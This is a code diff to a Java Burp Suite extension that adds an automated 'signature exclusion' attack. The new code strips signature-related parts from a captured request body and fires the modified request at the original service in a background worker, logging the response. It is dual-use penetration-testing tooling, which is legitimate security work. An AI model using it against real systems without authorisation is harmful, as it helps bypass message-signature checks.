@@ -4,6 +4,7 @@ import burp.IBurpExtenderCallbacks;
 import burp.IExtensionHelpers;
 import burp.IHttpRequestResponse;
 import burp.IRequestInfo;
+import burp.IHttpService;
 import java.io.PrintWriter;
 
 import java.net.URL;
@@ -14,6 +15,16 @@ import java.lang.*;
 import java.util.regex.*;
 import java.nio.charset.StandardCharsets;
 
+import javax.swing.*;
+import java.util.ArrayList;
+import java.util.concurrent.ExecutionException;
+
+import com.fasterxml.jackson.databind.JsonNode;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.fasterxml.jackson.core.JsonProcessingException;
+import java.io.IOException;
+
+
 public class SignatureExcl {
 
     private static PrintWriter stdout;
@@ -21,8 +32,13 @@ public class SignatureExcl {
     private final IExtensionHelpers helpers;
     private IHttpRequestResponse requestResponse;
     private IRequestInfo requestInfo;
+    private IResponseInfo responseInfo;
+    private IHttpService httpService;
     private int diff = 0;
     private boolean flag = false;
+    private static final Logger loggerInstance = Logger.getInstance();
+
+    private byte[] updateMessage;
 
     public SignatureExcl(IBurpExtenderCallbacks callbacks, IHttpRequestResponse message){
 
@@ -31,13 +47,13 @@ public class SignatureExcl {
         this.requestResponse = message;
         this.requestInfo = helpers.analyzeRequest(message);
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
+        this.httpService = message.getHttpService();
 
 
     }
 
 
     public void signatureAttack(){
-        stdout.println("inside sign excl");
 
 
 //        String request = new String(requestResponse.getRequest());
@@ -92,6 +108,85 @@ public class SignatureExcl {
         diff = msgStr.length() - tempStr.length();
         return tempStr;
     }
+
+    public void autoAttackSigExcl(){
+        loggerInstance.log(getClass(), "Executing AutoMated Signature Exclusion Attack"  , Logger.LogLevel.INFO);
+        List headers = requestInfo.getHeaders();
+        String request = new String(requestResponse.getRequest());
+        String messageBody = request.substring(requestInfo.getBodyOffset());
+
+        stdout.println(messageBody);
+        Matcher m = Pattern.compile("(?=(sg))").matcher(messageBody);
+        List<Integer> pos = new ArrayList<Integer>();
+        while (m.find()) {
+            pos.add(m.start());
+        }
+
+        for(int n:pos) {
+            messageBody = modifyString(messageBody, (n-diff));
+        }
+        stdout.println(messageBody);
+        updateMessage = helpers.buildHttpMessage(headers, messageBody.getBytes());
+        this.sendAttackReq();
+    }
+
+    /**
+     * User edited message converted into request
+     * @param modText
+     * @return
+     */
+
+    public byte[] generateRequest(String modText){
+        List headers = requestInfo.getHeaders();
+        updateMessage = helpers.buildHttpMessage(headers, modText.getBytes());
+        return updateMessage;
+    }
+
+
+    public void sendAttackReq(){
+        loggerInstance.log(getClass(), "Executing Signature Exclusion Attack"  , Logger.LogLevel.INFO);
+        AttackExecutor attackRequestExecutor = new AttackExecutor(updateMessage);
+        attackRequestExecutor.execute();
+    }
+
+
+    /**
+     * Java Swing worker to execute attack in the background
+     */
+
+
+    private class AttackExecutor extends SwingWorker<IHttpRequestResponse, Integer> {
+        private byte[] attackRequest;
+
+        AttackExecutor(byte[] attackRequest) {
+            this.attackRequest = attackRequest;
+        }
+
+        @Override
+        // Fire prepared request and return responses as IHttpRequestResponse
+        protected IHttpRequestResponse doInBackground() {
+            return callbacks.makeHttpRequest(httpService, attackRequest);
+        }
+
+        @Override
+        // Add response to response list, add new entry to attacker result
+        // window table and update process bar
+        protected void done() {
+            IHttpRequestResponse requestResponse;
+            try {
+                requestResponse = get();
+            } catch (InterruptedException | ExecutionException e) {
+                loggerInstance.log(SignatureExcl.class, "Failed to get request result: " + e.getMessage(), Logger.LogLevel.ERROR);
+                return;
+            }
+            // getting message from the response
+            String temp = new String(requestResponse.getResponse());
+            responseInfo = helpers.analyzeResponse(requestResponse.getResponse());
+            String messageBody = temp.substring(responseInfo.getBodyOffset());
+            loggerInstance.log(getClass(), "Attack Performed: " +messageBody , Logger.LogLevel.DEBUG);
+        }
+    }
+
 
 
 
